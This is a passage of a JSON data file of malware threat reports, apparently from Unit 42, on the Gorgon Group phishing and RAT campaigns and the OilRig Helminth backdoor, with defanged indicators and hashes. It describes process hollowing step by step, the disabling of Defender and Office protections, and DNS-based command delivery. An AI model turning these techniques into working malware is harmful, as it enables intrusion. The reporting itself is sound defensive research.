e26bfd03a888f0bda9fc81e148511fa98f73f8e8a915933cc\ndb3ffcbf136e0268ec66f28b30fa8ba350f74e02e8e737e61cc6ef8d8258027e\ndd26b85b6568595b1d2bbc47ce47d071ede75665fbd779d637b74663ead5539e\ndf9038660164623a827a8119d4cb3d71d0a5288b12bdfdd32c72769bf90a9ea0\ndfed16e9184a86e6fcd17a98f127410840d058db667e9975b43add100c33122e\ne0063d2524a89159cf5da12661225fbb27725bbd72acd9497b7207ecf2f3aeb6\ne00c55ddda9cbb82fb47924fafdf40c3394dc1127d9901c71a69ef3ef664b817\ne14a51d69211948163ab20b0cc68adf410bb821f2890f55d2d202c745f4ec1b8\ne2e3f243bbcad666852e64202d35f6dd88c58f5d24435d92975697b0efa8a775\ne37e25739e8bc4620d9d37d8f6b400cd82c85b89d206436ba35930ed96db6eb0\ne55b5ede808b6d491f18737d6a1cf34b5178f02e9ea01d7cff31a449888dbd73\ned28d9207acac2afff817eaa56d1599422e23946dffa4f8bade376d52a6af7d4\neda0853e814ee31a66c3b42af45cd66019ffd61eac30e97bd34c27d79253a1bb\nf1b3e58d060803b0ff6008386bab47fb8099ac75ee74f385ac34340a28bf716e\nf2091f71227180d74ba1ba4607635e623553b1826314dca91cb31839eb00c4ea\nf214d55ccb5db5edbaafe7d40b240c79f04c70d441adee01ef438f776eb37037\nf571ddc894915dee136cf24731ff3d79fe4f811b112d122a34a128628cb43c4a\nf7676d2a28992a382475af2ae0abca4794e1397ef3327f30f7d4cbdbc2ca0a68\nf8e20894c8c18d79e80b431008aa8bef46cc10a355a4934f9cc40ffd637b8890\nfa1bf7565352099b74624c8beeff6620411e1efe00e54f8b4190f69e243d5811\nfa784f69265ebe5e150cf5956a40d86335d1a5edc57fffcc7ce6eedc591c2751"
            ]
        }
    ],
    "6d8bc85c2f8f6cc597d0760a65ffd9f11510d955": [
        {
            "type": "paragraph",
            "content": [
                "Unit 42 researchers have been tracking Subaat, an attacker, since 2017.",
                "Recently Subaat drew our attention due to renewed targeted attack activity.",
                "Part of monitoring Subaat included realizing the actor was possibly part of a larger crew of individuals responsible for carrying out targeted attacks against worldwide governmental organizations.",
                "Technical analysis on some of the attacks as well as attribution links with Pakistan actors have been already depicted by 360 and Tuisec, in which they found interesting connections to a larger group of attackers Unit 42 researchers have been tracking, which we are calling Gorgon Group.",
                "In addition to the numerous targeted attacks, Unit 42 discovered that the group also performed a litany of attacks and operations around the globe, involving both criminal as well as targeted attacks.",
                "Starting in February 2018, Palo Alto Networks Unit 42 identified a campaign of attacks performed by members of Gorgon Group targeting governmental organizations in the United Kingdom, Spain, Russia, and the United States.",
                "Additionally, during that time, members of Gorgon Group were also performing criminal operations against targets across the globe, often using shared infrastructure with their targeted attack operations.",
                "Gorgon Group's activity is interesting because in addition to traditional command and control (C2) domain utilization, Gorgon Group used common URL shortening services to download payloads; ultimately providing an extensive list of click counts and statistical data.",
                "Also, interestingly, Gorgon Group has a diverse and active criminal element.",
                "On much of the C2 infrastructure we identified several crimeware family samples.",
                "RATs such as NjRat and infostealers like Lokibot were leveraging the same C2 infrastructure as that of the targeted attacks.",
                "Using numerous decoy documents and phishing emails, both styles of attacks lacked overall sophistication, but the effectiveness of this group and campaign cannot be denied."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Attack Delivery and Infrastructure Analysis\nThe attack methodology, as well as analysis of several of the \".vbs\", \".doc\" and \".exe\" samples found hosted in the attacker's infrastructure has been covered by 360 and Tuisec.",
                "Both 360 and Tuisec found that the most commonly observed and consistent attack pattern consists of the following stages:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1. Basic attacker methodology"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "At the initial stage, the phishing attempts are kept very simple and lightweight by using OLE2Link objects that will usually make use of URL shortening services such as Bitly and t2m[.]io."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 OLE2Link content example"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While investigating the domains and infrastructure used by the phishing components of Gorgon Group, Unit 42 researchers witnessed several common operational security flaws with Gorgon Group's actors throughout their many campaigns.",
                "It was one of these OPSEC failures that gave us an interesting cross-section of malware Gorgon Group is using.",
                "Included in the directories were a combination of files leveraged in targeted attacks mentioned above against nation states.",
                "Additionally, there was a plethora of malware samples that were criminal in nature."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3. Open directory listing of hxxp://stevemike-fireforce[.]info/"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Based on the contents and structure of the initial identified open directories, it was possible to find several infrastructure patterns in use.",
                "An example of a domain structure and malware delivery contents is shown in the following table:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 1.",
                "Malware samples and infrastructure for hxxp://stemtopx[.]com"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 2. Examples of domain patterns"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Gorgon Group Crew Breakdown\nFinding accessible directories, in combination with their other operational security failures, made it easy to start connecting the dots on Gorgon Group members.",
                "360 and Tuisec already identified some Gorgon Group members.",
                "In addition to Subaat, we counted an additional four actors performing attacks as part of Gorgon Group.",
                "While its not known if the attackers physically reside in Pakistan, all members of Gorgon Group purport to be in Pakistan based on their online personas.\n\nfudpages\n\nOne member of Gorgon Group- we're calling fudpages, was found during this campaign activity based on their utilization of shared infrastructure.",
                "One specific Microsoft document drew our attention.",
                "(446e1c80102c8b9662d66d44525cb9f519369061b02446e0d4cd30cd26d79a25)\nThis Microsoft Word document was sent via email to several industries across the US and Switzerland.",
                "We noticed that this document pulls down additional malware from a C2 also being used in attacks by other Gorgon Group members.",
                "Additionally, this document communicates to a relatively new piece of C2 infrastructure- umarguzardijye[.]com, which is hosted on 91[.]234[.]99[.]206."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4 WHOIS information for umarguzardijye[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Fudpages, similar to other Gorgon Group members, made many of the same OPSEC failures of his or her fellow Gorgon Group members."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5 Open directory of umarguzardijye[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The WHOIS record for our new domain, umarguzardijye[.]com, shows that the registrant organization is \"fudpages\" and the address provided in Pakistan.",
                "When looking closer at the IP hosting umarguzardijye[.]com, we noticed 91[.]234[.]99[.]206 hosts two additional domains that drew our attention-fudpages[.]ru and fudpage[.]ru.",
                "Fudpage appears to be a small marketplace selling bulletproof hosting, RDP sessions, fake documents and a litany of additional malicious wares."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 6 Advertisement website for FUD pages and spamming tools"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Listed on fudpage's marketplace are several pieces of contact information, which ultimately led us to an underground persona that was selling, distributing and trading maliciousness across underground forums."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 7. Underground forum posting for RAT"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Operating underground since at least 2016, fudpages is also active on streaming sites like Youtube, where they use it as an advertising platform."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 8.",
                "Youtube video posting on how to perform malicious activities"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Like all of Gorgon Groups members, Fudpages online profile, infrastructure utilization and standardization, connects them back to Gorgon Group.",
                "This connection to Gorgon Group helps illustrate the seemingly standardized methodologies Gorgon Group most often employs."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Tale of Two Intentions: Criminal and Targeted\nAs part of the investigation, Unit 42 researchers were able to identify an interesting characteristic about how the Gorgon Group crew uses shared infrastructure between cybercrime and targeted attacks.",
                "The crew combines both regular crime and targeted attack objectives using the same domain infrastructure over time, rarely changing their TTPs.",
                "Starting in mid-February, Unit 42 researchers have been tracking an active campaign sharing a significant portion of infrastructure leveraged by Gorgon Group for criminal and targeted attacks.",
                "In Figure 9, below, red indicates targeted IP addresses, malware, registrant information, and domains associated with the targeted attack campaign while blue indicates criminal attack IP addresses, malware used, registrant information, and domains:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 9.",
                "Overlap between infrastructure"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While looking at the total cluster of Gorgon Group activity, its also interesting to look at the total click volume during the campaigns timeframe.",
                "Leveraging click counts for the campaign for Bitly, we were able to see Gorgon Groups activity volume increase throughout April."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 10.",
                "Total clicks performed on Gorgon Group infrastructure over time"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Looking specifically at one domain used in both cybercrime and targeted attacks, we can see a micro viewpoint into their campaign.",
                "Between April 1, 2018 and May 30, 2018, we observed the domain stevemike-fireforce[.]info used in a Gorgon Group cybercrime campaign involving more than 2,300 emails and 19 documents in the initial attack.",
                "This same domain was also used during the same period of time in targeted attacks against several worldwide nation state agencies.",
                "Analysis of the data allowed Unit 42 researchers to make some interesting conclusions:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As a graphical representation, Figure 11, below, indicates the amount of unique sessions observed for this domain over the campaigns operational time, representing the attack intention in two separate areas.",
                "It's interesting to observe on April 24th, this domain delivers a targeted attack aimed at several worldwide governmental bodies, in the middle being of also being used in the delivery of a malspam campaign.",
                "The subject used in this case of targeted attack was \"Pakistan eying Sukhoi-35 figther planes as part of defense deal from Rusia\":"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 11 Crimeware activity versus targeted activity against stevemike-fireforce[.]info"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In order to have a better idea of the volume of unique attacks per date and intention, see the following volume-based representation in Figure 12, where targeted attack volumes are represented in red and crime in green:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 12.",
                "Volume of crimeware activity versus targeted attacks using stevemike-fireforce[.]info"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Focusing on one domain allowed us to quickly understand its usage and better understand how it interconnects to a larger malspam campaign."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Intention #1: Cybercrime\nCriminal attacks are not new to this crew, some of which was covered in our previous blog for Gorgon Group member Subaat.",
                "During the current campaign, Gorgon Groups criminal enterprises netted 132,840 Bitly clicks from mid-February to the present.",
                "Targeting a large cross-section of industries, there was little in terms of targeting during their criminal activity."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 13.",
                "Criminal Attacks Bitly Link Clicks Worldwide"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "A majority of the crimeware distribution was done via standard malspam campaigns leveraging well-known \"Purchase Order\" and \"SWIFT\" lures.",
                "Most of the filenames included a variance of filenames like:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The tools used by the crew do not really differ in general crime vs more targeted attacks, in both instances they related to several remote access and data stealing malware families.",
                "The top five malware families identified as criminal in nature so far have been the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "One interesting note about the criminal activity of Gorgon Group is their usage of Bitly.",
                "Similar to that of their targeted attacks, Gorgon Group leveraged Bitly for distribution and shortening of C2 domains.",
                "Using the same techniques across both their criminal and targeted activity, made it easier for us to cluster Gorgon Group infrastructure and activity."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 14.",
                "Clicks on Bitly links in criminal attacks"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Overall, in spite of the lack of sophistication in Gorgon Groups activity, they were still relatively successful; once again proving that simple attacks on individuals without proper protections, work."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Intention #2: Targeted Attacks\nBeginning in early March 2018, Unit 42 started observing targeted attacks against Russian, Spanish and United States government agencies operating in Pakistan.",
                "As we continued to investigate, it became apparent that Gorgon Group had been consistently targeting worldwide governmental organizations operating within Pakistan.",
                "While Gorgon Group has been making minor changes in their methodologies, they are still actively involved in both targeted and criminal attacks.",
                "This Gorgon Group campaign leveraged spear phishing emails with Microsoft Word documents exploiting CVE-2017-0199.",
                "The spear phishing emails involved in this campaign would most often originate from Gmail accounts masquerading as legitimate individuals, such as a prominent Lt. Col in the Pakistani military.",
                "The subjects of the spear phishing emails were also interesting, often contained subject matter related to terrorist groups, military activity, or political topics."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additionally, the following filenames were witnessed in these attacks (spelling and grammar mistakes included):"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payloads for these attacks varied in malware family.",
                "The popular NanoCoreRAT, QuasarRAT, and NJRAT variants were used heavily.",
                "In a number of these attacks, the popular third-party URL shortening service Bitly was used to ultimately deliver the payloads for these attacks.",
                "It's important to remember, that while we were using Bitly links to help gauge click location, anyone who clicks these links (including researchers) are also counted.",
                "So, while having this click information is valuable, it's only one small piece of a larger picture related to targeting."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 15.",
                "Bitly Click Information Related to a Gorgon Group C2 Domain"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The heaviest concentration of Bitly URL interaction came from Pakistan, which at 410 clicks accounted for 39% of all clicks.",
                "The United States amassed 194 clicks, accounting for 19%."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 16 Clicks on Bitly links in targeted attacks"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The attacks took place primarily in March, late April, and early May of this year."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Conclusion\nGorgon Group isn't the first actor group we've witnessed dabble in both nation state level and criminal attacks.",
                "What makes Gorgon Group unique is, that despite the groups operational security failures, they still remained particularly effective.",
                "Looking closer at the actors participating in Gorgon Group gave us a unique perspective into the inner workings of an attack.",
                "Leveraging the same infrastructure for targeted attacks and criminal enterprises made for an interesting cross-section of mixed intentions.",
                "Ultimately, this lead us to the conclusion that several of Gorgon Groups members have a nexus in Pakistan.",
                "While Gorgon Group remains active, Palo Alto Networks customers are protected from this threat in the following ways:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Appendix"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Analysis of a targeted attack\n\"1971 Liberation War Freedom Fighters in Pakistan ArmyCustody Database98\"\nThe delivery documents used in the targeted attacks are Microsoft Office documents that contain a macro that attempts to compromise the system.",
                "The infection process is rather interesting, as it involves multiple layers of .NET assemblies that will eventually download the NanoCore remote administration tool (RAT) from a remote server and inject it into another process.",
                "In some instances, we have also seen the RemcosRAT malware family delivered as the final payload.",
                "The infection process not only downloads and executes a payload, but it also downloads and opens a decoy document to lower the recipient's suspicions of the entire process.",
                "Additionally, the process attempts to lower the overall security of the system by disabling security features in Microsoft Office and Windows Defender.",
                "The payloads themselves are rather interesting, as the developer wraps the malicious code with legitimate source code freely available online."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Delivery document\nThe delivery document contains a macro that downloads an executable from a remote server.",
                "The macro downloads a payload from hxxp://lokipanelhostingpanel[.]gq/work/kh/1.exe (SHA256: 84ed59953f57f5927b9843f35ca3c325155d5210824d3b79b060755827b51f72) by running the following command line process:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The macro then attempts to kill Microsoft Office and Windows Defender processes using the taskkill command.",
                "The command does not attempt to kill the specific Office process that would load the particular delivery document, such as Excel in the case of this .xlam file, but instead attempts to kill processes associated with Word, Excel, PowerPoint and Publisher.",
                "This blanket approach to kill the appropriate process suggests that the actor does not change this command within their macro across delivery documents they created within these Microsoft Office applications.",
                "The command does not just attempt to kill the Windows Defender process, but also attempts to clear the detection definitions to not trigger an antivirus alert.",
                "The macro performs all of these activities with the following command:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The macro also attempts to deactivate security mechanisms within Microsoft Office products by modifying the registry.",
                "First, the macro attempts to enable macros in multiple versions of Word, PowerPoint, Publisher and Excel by setting the following registry keys to the value of 1:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The macro also attempts to disable protections provided by the Protected View capability within Word, Excel, and PowerPoint by setting the following registry keys to a value of 1:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "First Stage Payload\nThe payload installed by the macro is a downloader Trojan written in VB.NET that downloads a secondary payload and decoy document.",
                "It appears the author of this downloader used the source code from an open source tool called \"Sales System Application\", which is freely available at hxxp://www.a1vbcode[.]com/app-2999.asp.",
                "We believe the author of the downloader uses this Sales System Application to provide a legitimate look to their malicious payload.",
                "The malware author adds their own code to the application to run their malicious code before calling the legitimate functions that display the graphical user interface.",
                "The following functions are called when the application attempts to initialize the menu:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The \"Speed\" method in the legitimate ETransaksi class contains legitimate code from the Sales System Application; however, the author of this tool includes this code in an if/else construct that bypasses these instructions by setting a false flag to skip the legitimate code and execute the next step to the malicious code.",
                "The following code example shows the false flag being set (5 > 115) and the ETransaksi.diomadnfagaghagh method being called:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payload uses this technique to run a chain of methods that eventually carry out its malicious task.",
                "With the exception of the Speed method previously mentioned, the names of the methods called in this chain appear to be fairly random, as seen in the following list:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The last two methods in the chain carry out a majority of the first payloads functionality.",
                "The ETransaksi.gsgjIDJIGJIGJIGJIFDOSpl method obtains a resource named \"fgjfaieSDFAOKEfj.GSrdofjksrgj",
                "\", which is decrypted in the ETransaksi.",
                "FJaioefgkaoeK method using a multibyte XOR cipher with the following key:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The resulting cleartext is another .NET assembly, which the payload will load within its own process space."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Embedded Trojan\nThis Trojan loaded by the first payload contains several embedded executables that it uses to ultimately download and execute a secondary payload, as well as downloading and opening a decoy document.",
                "An unknown programmatic builder tool appears to have created this Trojan, as the code shows multiple configuration options for additional functionality that were not enabled within this specific sample.",
                "Upon execution, this Trojan checks to see if it was configured with \"BINDERON\" to determine if it should extract an embedded payload from a resource named \"B\", save it to %TEMP%\\%BIND1%, and create a new process with the embedded payload.",
                "While the Trojan was configured to carry out this activity, the actor did not embed a payload within the \"B\" resource, so this functionality does not carry out any activities, rather it just causes an exception and continues running.",
                "Another configuration option encountered by this Trojan is a check for '%STARTUPON%'.",
                "This sample was not configured to execute with this option enabled, however, should this option be enabled, the Trojan would attempt to install itself to the system at a specific location by writing its contents in base64-encoded format to the following file:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "%APPDATA%\\Microsoft\\Windows\\DsvHelper\\%DECRY%.txt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Trojan then reads the contents of the %DECRY%.txt file, decode them and write the decoded data to the following file:\n%USERPROFILE%\\APPDATA\\Roaming\\Microsoft\\Windows\\DsvHelper\\@RANDOM@.exe\nThe Trojan would then create a new process using the @RANDOM@.exe file.",
                "When the Trojan runs as an executable within the \"DsvHelper\" folder, the Trojan will create a shortcut (.lnk file) and save the shortcut to the 'DsvHelper' folder.",
                "It then creates the following registry key to automatically run the Trojan each time the system starts:\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\@RANDOM@\nThe main behavior carried out by this Trojan involves obtaining an embedded executable, hollowing the current Trojan, writing the new embedded executable to the process memory and calling a specific function in the newly written payload.",
                "The embedded payload written to process memory exists in the \"R\" resource and called function in the new payload is named \"RPe.Test.Work\".",
                "The function will take another executable embedded in the initial Trojan as a resource named \"M\", which it attempts to inject into the following process to execute:\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\cvtres.exe\nWhile it's configured to inject into cvtres.exe, the Trojan is also capable of injecting its code into the following process as well:\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Embedded injector Trojan\nThe R payload discussed above is nothing more than an injector Trojan, which accepts a path to an executable and a buffer of code to inject into the process as arguments.",
                "The R payload will create a process using the supplied path using the CreateProcessA API function.",
                "The payload then finds the base address of the newly created process using the GetThreadContext API function, and then calls NtUnmapViewOfSection to hollow the process.",
                "The payload then calls the VirtualAllocEx API to create a buffer in the newly hollowed process and the WriteProcessMemory API to write the supplied data buffer that contains the code to inject to this newly created buffer.",
                "The payload then sets EIP to the entry point of the newly injected code using the SetThreadContext API, and finally calls the NtAlertResumeThread API function to run the injected code."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Embedded Downloader Trojan\nThe M payload (referenced previously along with the R payload, above) injected and executed within the memory space of the other process is a downloader Trojan.",
                "This specific downloader appears to have been created using a VB2Exe tool, as the functional code that carries out the downloading functionality exists as a VBScript embedded within the payload.",
                "The payload extracts this VBScript from a resource and saves it to a file that it extracts from another resource.",
                "The filename used to save the VBScript is \"khm.vbs\", which is eventually run using \"wscript\".",
                "The VBScript has a SHA256 has of 649e3922ec53d5b195ed23aac08148faeb561f47e891b1e6ff60a2a9df4fea17, which calls two PowerShell commands to download and execute a payload and downloading and opening of a decoy document.",
                "The payload is downloaded from the following location and saved to \"%PUBLIC%\\svchost32.exe\":"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://lokipanelhostingpanel[.]gq/work/kh/1s.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The decoy document is downloaded from hxxp://lokipanelhostingpanel[.]gq/work/kh/1.docx and saved to \"%PUBLIC%\\svchost32.docx\".",
                "When opened, the decoy document shows the following content, which contains the image and copied text from a news article titled Top civil-military body rejects Nawazs controversial statement on Mumbai attacks, as seen in the following screenshot:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 17.",
                "Decoy document downloaded by malware"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Final Payload\nThe final payload is a dropper Trojan that installs the NanoCore RAT.",
                "The author of this payload (SHA256: 690fc694b0840dbabb462ae46eb836777420b3354e53a6944a2e169b965b0bec) appears to have used an open source tool called \"Saransh Email System\" as a basis of this tool, which was likely downloaded from hxxp://www.a1vbcode[.]com/app-4601.asp.",
                "Much like the original payload, this tool uses if/else statements to skip the legitimate code in the Saransh Email System source to run the malicious functions, which have the same method names as the original tool and follow the same call sequence:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This chain of functions eventually loads a resource named 'GSrdofjksrgj', which the tool decrypts using the same algorithm and key as in the initial payload:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The decrypted payload has a SHA256 hash of 5e805a88294f6d25d55103d19d13e798e01ad70e6b89e9c58db5d468cc63b3d5, which is a variant of the NanoCore remote administration tool.",
                "This variant of NanoCore was configured to communicate with the following IP address as its C2 server over TCP port 6666:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "115.186.136[.]237"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Bitly short URLs and expanded domains"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Domains\nFor a list of domains encountered in use by malware throughout this campaign, please refer to the following file."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Hashes\nFor a list of all hashes of malware encountered during this campaign, please refer to the following file."
            ]
        }
    ],
    "c060388dc1fd3bafb88a8f67488f5519af7db0c7": [
        {
            "type": "paragraph",
            "content": [
                "In May 2016, Unit 42 observed targeted attacks primarily focused on financial institutions and technology organizations within Saudi Arabia.",
                "Artifacts identified within the malware samples related to these attacks also suggest the targeting of the defense industry in Saudi Arabia, which appears to be related to an earlier wave of attacks carried out in the fall of 2015.",
                "We have grouped these two waves of attacks into a campaign we have named OilRig."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In recent OilRig attacks, the threat actors purport to be legitimate service providers offering service and technical troubleshooting as a social engineering theme in their spear-phishing attacks.",
                "Earlier OilRig attacks appear to use fake job offers as a social engineering theme.",
                "The campaign appears highly targeted and delivers a backdoor we have called Helminth.",
                "Over the course of the attack campaign, we have observed two different variations of the Helminth backdoor, one written in VBScript and PowerShell that was delivered via a macro within Excel spreadsheets and the other a standalone Windows executable."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In May 2016, Unit 42 began researching attacks that used spear-phishing emails with attachments, specifically malicious Excel spreadsheets sent to financial organizations within Saudi Arabia.",
                "We observed spear-phishing emails sent between May 4 and May 12 of this year that delivered these malicious Excel spreadsheets, which we are tracking as Clayslide.",
                "ClaySlide documents contain malicious macros that display decoy content within the spreadsheet and installs a variant of a Helminth backdoor.",
                "FireEye also reported on these attacks in a May 22 blog post."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The macro within Clayslide samples installs the Helminth script, which is composed of a VBScript called update.vbs and a PowersShell script called dns.ps1.",
                "The purpose of the VBScript is to send network beacons to its command and control server using HTTP requests and will either download a file or run a batch script provided within the HTTP response.",
                "The VBScript also uploads the output of the provided batch scripts to the command and control (C2) server, which provides threat actors a functional remote shell to the system."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The PowerShell script has similar capabilities to the VBScript, but instead of using HTTP for communications it uses a series of DNS queries to send and receive data from the server.",
                "This communication channel relies on the C2 server responding to DNS queries with IP addresses that the PowerShell script will parse treat as data to construct a batch script to execute on the system.",
                "The script specifically looks for the IP address 33.33.x.x to mark the beginning of the batch script transfer.",
                "The script will continue sending additional DNS requests and use the octets of the resolving IP addresses as characters to write to the batch script.",
                "The script continues to write data to the batch script until it receives the IP address 35.35.35.35, which notifies the script to stop saving data to the file and to run the batch script."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Please reference the Appendix for more detailed information on the Clayslide delivery documents and the Helminth script variant."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additional samples were discovered in WildFire exhibiting the same DNS-based C2 behavior as the script variant of Helminth; however, many of these samples were found to be Windows executable, instead of the previously observed VBScript and PowerShell combination.",
                "These samples were found to contain the same functionality as the previously mentioned Helminth samples.",
                "Figure 1 shows the code within the VBScript version of Helminth checking resolving IP addresses for the 35.35.35.35 IP address to stop appending data to a batch script before executing it, while Figure 2 shows the same functionality within the executable version of the Trojan."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 Helminth dns.ps1 PowerShell script looking for 35.35.35.35 IP address"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 Helminth executable looking for the 35.35.35.35 IP address"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This suggests that the threat actors developed the executable variant of Helminth as a standalone option whose installation does not rely on a macro within an Excel spreadsheet.",
                "This also suggests that the threat actors purposely used the same communication methods across both variants with the intention to use the same command and control server application.",
                "This variant of the Trojan is also where we obtained its name, as several of these payloads had the following debug symbol path that suggests the malware author called this project Helminth:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "E:\\Projects\\hlm updated\\Helminth\\Release\\Helminth.pdb"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Please reference the Appendix for additional details on the Helminth executable variant."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unit 42 does not have detailed targeting information associated with attacks delivering the executable variant of the Helminth Trojan, however, we found a Zip archive created in August 2015 that may have been used by the threat actors to deliver the Helminth Trojan.",
                "This Zip file was hosted at the following location:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "hxxp://minfosecu.doosan[.]com/data/joboffer.zip"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Zip archive is encrypted with an unknown password, but we know it contains two files named joboffer.chm and thumb.db.",
                "The thumb.db file in the archive has the same name and file size (368128 bytes) as a dropper Trojan we track as HerHer (SHA256: fb424443ad3e27ef535574cf7e67fbf9054949c48ec19be0b9ddfbfc733f9b07) that installs a known Helminth executable sample.",
                "The joboffer.chm file is a compiled HTML file that we believe loads and executes the thumb.db file as a payload, but we cannot be absolutely sure as we do not have the password required to extract the files from the archive."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The decoy opened by the Helminth sample installed by thumb.db (seen in Figure 3) is a dialog box associated with HTML help, which further strengthens our theory that the joboffer.chm ran the sample.",
                "This decoy suggests that the threat actors wanted to open the HTML help dialog after installing the Helminth Trojan, as the joboffer.chm file is effectively a standalone HTML file.",
                "We believe that the threat actors employed social engineering to underplay the situation and provide a different legitimate job offer if the victim responded with concerns of malicious activity."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3 A Helminth sample displays this dialog box if provided 'w' on the command line"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The executable variant of Helminth is installed with a dropper Trojan that we are tracking as the HerHer Trojan.",
                "This Trojan has two objectives: installing embedded Trojans and displaying either a fake error prompt or a fake trubleshooting\" (the malware author misspelled this word in each sample) utility.",
                "Figure 4 is an example of the fake error prompt displayed by the HerHer Trojan."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4 Fake Error Prompt Displayed by the HerHer Trojan"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Helminth executable variant is very similar in functionality to its script-based counterpart, as it also communicates with its C2 server using both HTTP and DNS queries.",
                "The major difference in capabilities between the two variants is that the executable version comes with a module that Helminth uses to log keystrokes and the clipboard contents to exfiltrate to the C2 server."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Helminth executable samples send artifacts within network beacons to its C2 server that the Trojan refers to as a Group and Name.",
                "We extracted the group and name values from the Helminth executable samples to determine their purpose.",
                "It appears that the group values hardcoded into the malware is associated with the targeted organization, as several are Saudi Arabian organizations within the telecommunications and defense industries.",
                "This suggests that the threat actors are not only focused on financial organizations, as their target set could include other industries as well."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The name values hardcoded into the Helminth samples are also interesting, as a majority of the names are related to famous philosophers, such as Plato (Greek philosopher), Arasto (Persian and Urdu for Greek philosopher Aristotle), and ALAfghani (Jamal ad-Din al-Afghani, Islamic Philosopher).",
                "Other name values embedded in samples contain other Persian words, such as Nafti () that translates to oily, which led us to name this campaign OilRig)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
